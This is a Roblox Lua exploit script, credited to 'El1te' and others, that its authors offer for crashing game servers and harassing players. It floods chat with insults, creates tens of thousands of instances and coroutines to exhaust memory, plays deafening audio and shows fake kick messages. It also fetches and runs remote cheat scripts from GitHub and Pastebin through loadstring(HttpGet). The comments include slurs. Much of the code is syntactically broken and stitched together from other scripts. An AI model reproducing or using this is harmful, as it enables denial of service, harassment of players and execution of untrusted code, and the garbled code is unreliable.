-----
--[[
 ________   ______   __     __       ___ __ __   ________   ______   ______        _______   __  __    ___   __   __   ________  ______    __  __   ______     
/_______/\ /_____/\ /__/\ /__/\     /__//_//_/\ /_______/\ /_____/\ /_____/\     /_______/\ /_/\/_/\  /__/\ /_/\ /_/\ /_______/\/_____/\  /_/\/_/\ /_____/\    
\::: _  \ \\::::_\/_\ \::\\:.\ \    \::\| \| \ \\::: _  \ \\:::_ \ \\::::_\/_    \::: _  \ \\ \ \ \ \ \::\/ \:\ \\ \ \\__.::._\/\:::_ \ \ \:\ \:\ \\::::_\/_   
 \::(_)  \ \\:\/___/\\_\::_\:_\/     \:.      \ \\::(_)  \ \\:\ \ \ \\:\/___/\    \::(_)  \/_\:\_\ \ \ ___   \:\ \\ \ \  \::\ \  \:(_) ) )_\:\ \:\ \\:\/___/\  
  \:: __  \ \\_::._\:\ _\/__\_\_/\    \:.\-/\  \ \\:: __  \ \\:\ \ \ \\::___\/_    \::  _  \ \\::::_\//__/\   \:\_/.:\ \ _\::\ \__\: __ `\ \\:\ \:\ \\_::._\:\ 
   \:.\ \  \ \ /____\:\\ \ \ \::\ \    \. \  \  \ \\:.\ \  \ \\:\/.:| |\:\____/\    \::(_)  \ \ \::\ \\::\/    \ ..::/ //__\::\__/\\ \ `\ \ \\:\_\:\ \ /____\:\
    \__\/\__\/ \_____\/ \_\/  \__\/     \__\/ \__\/ \__\/\__\/ \____/_/ \_____\/     \_______\/  \__\/          \___/_( \________\/ \_\/ \_\/ \_____\/ \_____\/
                                                                                                                                                               
 ______   __         ____   _________  ______       ______   ________   ______   ______   ______   ______                                                      
/_____/\ /_/\       /___/\ /________/\/_____/\     /_____/\ /_______/\ /_____/\ /_____/\ /_____/\ /_____/\                                                     
\::::_\/_\:\ \      \_::\ \\__.::.__\/\::::_\/_    \:::__\/ \::: _  \ \\::::_\/_\:::_ \ \\:::_:\ \\:::_ \ \                                                    
 \:\/___/\\:\ \       \::\ \  \::\ \   \:\/___/\    \:\ \  __\::(_)  \ \\:\/___/\\:(_) \ \  /_\:\ \\:(_) ) )_                                                  
  \::___\/_\:\ \____  _\: \ \__\::\ \   \::___\/_    \:\ \/_/\\:: __  \ \\_::._\:\\: ___\/  \::_:\ \\: __ `\ \                                                 
   \:\____/\\:\/___/\/__\: \__/\\::\ \   \:\____/\    \:\_\ \ \\:.\ \  \ \ /____\:\\ \ \    /___\:\ '\ \ `\ \ \                                                
    \_____\/ \_____\/\________\/ \__\/    \_____\/     \_____\/ \__\/\__\/ \_____\/ \_\/    \______/  \_\/ \_\/       
 ____  ____  ____  ____  _             _     ____  _____   ____  ____  ____  _  ____  _____ 
/   _\/  __\/  _ \/ ___\/ \ /|    /\  / \   /  _ \/  __/  / ___\/   _\/  __\/ \/  __\/__ __\
|  /  |  \/|| / \||    \| |_||   / /  | |   | / \|| |  _  |    \|  /  |  \/|| ||  \/|  / \  
|  \__|    /| |-||\___ || | ||  / /   | |_/\| |-||| |_//  \___ ||  \__|    /| ||  __/  | |  
\____/\_/\_\\_/ \|\____/\_/ \|  \/    \____/\_/ \|\____\  \____/\____/\_/\_\\_/\_/     \_/  
                                                                                            
]]--















--[[
 Thanks for using my script I appreciate it
------------=========== INFO -----------=======
 Ok So Basically I combined some scripts together like,
  a script that just scares players
 Then Annoys them
 Most of the code isn't mine and some of the code is.
 Completely Shutdowns a server idk how to fix it if this script still doesn't work it completely crashed my game when I executed it.
 Thanks for using my script
 El1te / SennieJack / ThatRobloxScripter
 Update 1  added something idk anything bout
 Update 2 added stuff that hopefully make it so that it crashes for everyone  now at 278 lines of code or smt ok bye ily (no homo)
 Update 3 Did a massive update now at like 400 lines of code and added alot of more stuff and features.
]]--
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
	Title = "Information From Owner";
	Text = "Hi!, Thanks For Using This Script wait 10 seconds for the server to crash!";
	Duration = 5;
})

---- For Retarded kids in ragdoll engine
if game.Id = Ragdoll then
local msg = "Pretty Ugly YO MAMA"
while wait() do
game.Player:Chat (msg)
end
end

local msg = "DEEZ NUTS"
while wait() do
game.Player:Chat (msg)
end

--- INSTA CRASH

wait(5)
print("Fall Damage")
print("Beamed By Your Pretty Ugly Mom")


while true do
	local LP = game:GetService('Players').LocalPlayer
if workspace:FindFirstChild(LP.Name) == nil then LP.CharacterAdded:Wait() end
local Char = workspace[LP.Name]
local Hat = Char['Humanoid']:GetAccessories()[1]
local Handle = Hat['Handle']

--/* Tool Setup
local Tool = Instance.new("Tool",LP.Backpack)
Tool.Grip = Tool.Grip * CFrame.new(0,-100,0)
Tool.Parent = Char
Handle.Parent = Tool

game:GetService('RunService').Stepped:Connect(function()
   for _,Part in next, Char:GetChildren() do
       if Part:IsA('BasePart') then
           Part.CanCollide = false
       end
   end
end)

local HPart; if Char:FindFirstChild('Right Arm') then
   HPart = 'Right Arm'
else
   HPart = 'RightHand'
end

--/* RightGrip Instance Crash
for _ = 1,60000 do
   local Grip = Char[HPart].RightGrip:Clone()
   Grip.Parent = Char.Humanoid['Status']
end

--/* Void Deletion
wait(1) local CPart = Instance.new('Part',workspace)
CPart.CanCollide = false
CPart.Transparency = 1 CPart.Anchored = true
CPart.CFrame = Char['Head'].CFrame
workspace.Camera.CameraSubject = CPart
warn('Shutdown Activated') Char['Humanoid'].Sit = true
local BV = Instance.new('BodyVelocity', Char['HumanoidRootPart'])
BV.MaxForce = Vector3.new(1e5,1e5,1e5)
BV.Velocity = Vector3.new(0,-1e5,0)
BV.P = 1e5
end

while true do 
print("Fall Damage")
print("Beamed By Your Pretty Ugly Mom")
end

----------------------
wait(60)
local plr = game.Players.localPlayer
local telePart = script.Parent



local TeleportService = game:GetService('TeleportService')



local placeID = 5020048423



local canTeleport = true


	canTeleport = false

		TeleportService:Teleport(placeID, plr)


wait(10)
while true do
	wait(Process)
	print("SERVER GETTING BEAMED LOL")
	print("SERVER GETTING BEAMED LOL")
	print("SERVER GETTING BEAMED LOL")
end
wait(3)
print("In Process Of Executing")
wait(Process)

local Process = 5
--- CREDITS ---
-- Thanks to NougatBitz For The Gui
-- Thanks to Adwas For The gui
-----------------------------------------------
--- Programmers ---
--- Casp3r (Co - Devoloper) - Helped With Errors
--- Virus (Found Scripts) - Explantory
--- El1te (Main Devoloper) - Worked On The Script
-------------------------------------------------

--- SUPPORTED GAMES  (only for the gui's i stole lol)---
local Ragdoll = 22653509 
local Arsenal = 286090429
local Infection = 1165047394

------ STARTING SCRIPT --------
local scriptwait = 10
------- SCRIPT HANDLER ---------------------
local HttpService = game:GetService('HttpService')
local AllowThirdyPartyTeleports = game:GetService('AllowThirdPartyTeleports')
local HttpRbxApiService = game:GetService('HttpRbxApiService')
local HTTPService = game:GetService('HTTPService')

game.workspace.filteringenabled = true
while true do 
	game.workspace.filteringenabled = true
	game.workspace.RespectFilteringEnabled = true
end

----------------------------------------
------ RAGDOLL & OTHERS
local RagdollEngine = 22653509 

if game.CreatorId == RagdollEngine then

	print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jxq7/MyScripts/main/Ragdoll%20Engine%20%5BASX%5D.lua'),true))()
	local plr = game.Players
	plr.RespawnTime = 1
end

local StarterGui = game:GetService("StarterGui") -- not sure why you used CoreGui
local bindable = Instance.new("BindableFunction")

function bindable.OnInvoke(response)
	print(response .. " chosen")
end

StarterGui:SetCore("SendNotification", {
	Title = "Info",
	Text = "I Loaded A Ragdoll Engine Script is that okay?",
	Duration = 5,
	Callback = bindable,
	Button1 = "Ok,",
	Button2 = "Bett"
})

--- ARSENAL
if game.PlaceId == Arsenal  then
	wait(10)
	print(player.Name .."Is Playing Arsenal")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
	if error then
		print(error)
		loadstring(game:HttpGet("https://github.com/Jxq7/MyScripts/blob/main/Arsenal%20%5BASX%5D.lua"))();
	end

end


--------- infeEcCcTiOnNn
if game.PlaceId == Infection then

	print(player.Name.. "Is Playing Infection")
	loadstring(game:HttpGet("https://pastebin.com/raw/KRvb0vKv"))();
	if error then
		local ErrorTXT = "Error! Sorry i dont know what other script is good for this game"
		game.Players.LocalPlayer:Kick(ErrorTXT)
	end
end



------------------------------------------------------ UNSUPPORTED ---------------------------------------------------------



local StartWait = 35
wait(StartWait)
local Start = print("STARTING")
local lag_strength = 100


idk = function(x)
	local r = math.random(1,10)
	print(r)
	return x[r]
end

idkArray = {"a","b","c","d","e","f","g","h","i","j"}

print(idk(idkArray))

---- stolen random 
local messages = 
	{
		"LOL YALL ABOUT TO GET YOUR IPADS BLOWN UP",
		"RIP 1ST DEGREE BURNS",
		"E",
	}

local timePerMessage = 10


while wait(timePerMessage) do

	game.StarterGui:SetCore("ChatMakeSystemMessage", 
		{
			Text = "[SERVER] " .. messages[math.random(1, #messages)],
			Color = Color3.fromRGB(5, 255, 63),
			Font = Enum.Font.SourceSansBold,
			TextSize = 18,
		})
end
wait(0.5)


game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "Beaming Server.......";
	Color = Color3.new(255, 0, 0);
	Font = Enum.Font.SourceSansBold;
	FontSize = Enum.FontSize.Size24;
})


wait(20)
print("Rip server")
while true do
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "Hi, Listen Here Buddy Pretty Ugly Your Mom Wait while i trash this server. :)";
		Color = Color3.new(255, 0, 0);
		Font = Enum.Font.SourceSansBold;
		FontSize = Enum.FontSize.Size24;
	})
end
------------ WARNNING MESSAGE ---------
game.StarterGui:SetCore("SendNotification", {
	Title = "Warrning.";
	Text = "Your server is Currently getting trashed. While you wait until you server fully shutdown Pretty Ugly Your Mom";
})




--------------- MAIN MOUDLE --------
-------- AUDIO
wait(1)
local player = game.Players.LocalPlayer
player.CameraMode = Enum.CameraMode.LockFirstPerson
Instance.new("BlurEffect",workspace.CurrentCamera).Size = 999
player.PlayerGui:ClearAllChildren()
game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
for a = 1,10 do
	for i = 1,10 do
		local audio = Instance.new("Sound",player.PlayerGui)
		audio.Volume = 10
		audio.PlaybackSpeed = a*i
		audio.Looped = true
		if math.random(1,2) == 1 then
			audio.SoundId = "rbxassetid://168137470"
		else
			audio.SoundId = "rbxassetid://714583842"
		end
		audio:Play()
		--wait()
	end
end
wait(1)
while true do end


wait(2)
-------------------------
------------------------ LAG ----------------
--- V2
sounds = {}

function getSounds(loc)
	if loc:IsA("Sound") then
		table.insert(sounds,loc)
	end
	for _,obj in pairs(loc:GetChildren()) do
		getSounds(obj)
	end
end
-- V1
while wait(0.2) do
	for _,plr in pairs(game.Players:GetPlayers()) do
		pcall(function()
			for _,obj in pairs(plr.Character.Head:GetChildren()) do
				if obj:IsA("Sound") then
					obj:Play()
				end
			end
		end)
	end
end


------ FINAL TOUCH ---------
while true do
	print("FUCK YOU YOU SURVIVED ROUND 1! WAIT UNTIL FUCKS YOU UP"..player.Name)
end --- this part is 100% made by me

local myLag = Instance.new("Part",workspace)
local nameX = "Get Beamed"
myLag.Name = nameX


for _, v in pairs(game:GetDescendants()) do
	spawn(function()
		pcall(require, v)
	end)
end
-------------------------------





----- le random
local plrs = game.Players




plrs.PlayerAdded:Connect(function(plr)

	if plr.UserId == 1840165873 then
		game.StarterGui:SetCore("SendNotification", {
			Title = "DADDY HAS JOINED";
			Text = "time to celebrate ";
		})




	end

end)


wait(15)


--- EXTRA LAG+ BASSIC CHARACTER HACKS ---
--- SCRIPT HANDLER & EXTRA LAG
while true do
	print("EXTRA LAG ENABLED")
	game:Shutdown()
	game.workspace.filteringenabled = true
	game.workspace.AllowThirdPartySales = true
end


local plr = game.Players.LocalPlayer
local rs = game:GetService("RunService")

function lag()
	while true do
		script:clone().Parent = plr.PlayerGui
		print("Rest in peace.")
	end
end

function memoryLeak()
	for i = 1, 50000 do
		coroutine.resume(coroutine.create(function()
			for i = 1, 50000 do
				spawn(lag)
			end
		end))
	end
end

while true do
	spawn(memoryLeak)
end


-- CH HACKS --
-- Variables
local WA = Target.CharacterWalkSpeed
local Emotes = game.StarterPlayer.UserEmotesEnabled 
local HDD = game.StarterPlayer.HealthDisplayDistance
local LCA = game.StarterPlayer.LoadCharacterAppearance
local Target = game.StarterPlayer
local FAILEDTXT = "Bobby shmurda didn't get out of jail"
while true do
	local SC = Instance.new("Script")
end


---- ADWAS'S SCRIPT
--[[
 ___       __   ________  ___       ___           ___    ___ ________  _______   ________  ___  ___  ________  _______        _________  _____ ______           
|\  \     |\  \|\   __  \|\  \     |\  \         |\  \  /  /|\   ____\|\  ___ \ |\   ____\|\  \|\  \|\   __  \|\  ___ \   ___|\___   ___\\   _ \  _   \  ___    
\ \  \    \ \  \ \  \|\  \ \  \    \ \  \        \ \  \/  / | \  \___|\ \   __/|\ \  \___|\ \  \\\  \ \  \|\  \ \   __/| |\__\|___ \  \_\ \  \\\__\ \  \|\__\   
 \ \  \  __\ \  \ \   __  \ \  \    \ \  \        \ \    / / \ \_____  \ \  \_|/_\ \  \    \ \  \\\  \ \   _  _\ \  \_|/_\|__|    \ \  \ \ \  \\|__| \  \|__|   
  \ \  \|\__\_\  \ \  \ \  \ \  \____\ \  \____    \/  /  /   \|____|\  \ \  \_|\ \ \  \____\ \  \\\  \ \  \\  \\ \  \_|\ \  ___   \ \  \ \ \  \    \ \  \  ___ 
   \ \____________\ \__\ \__\ \_______\ \_______\__/  / /       ____\_\  \ \_______\ \_______\ \_______\ \__\\ _\\ \_______\|\__\   \ \__\ \ \__\    \ \__\|\__\
    \|____________|\|__|\|__|\|_______|\|_______|\___/ /       |\_________\|_______|\|_______|\|_______|\|__|\|__|\|_______|\|__|    \|__|  \|__|     \|__|\|__|
                                                \|___|/        \|_________|                                                                                     
]]--


---- SCARE PPL


	game.Players.LocalPlayer:Kick("Same Account Launched From a diffrent device") --- nothing happend just to scaare them lol





---- IF STATMENTS ----
if Target.CharacterWalkSpeed == 16 then
	print(FAILEDTXT)
end


--- 308 Lines Of Code Milestone
game:Shutdown();
print("I Did my best to crash this server.")
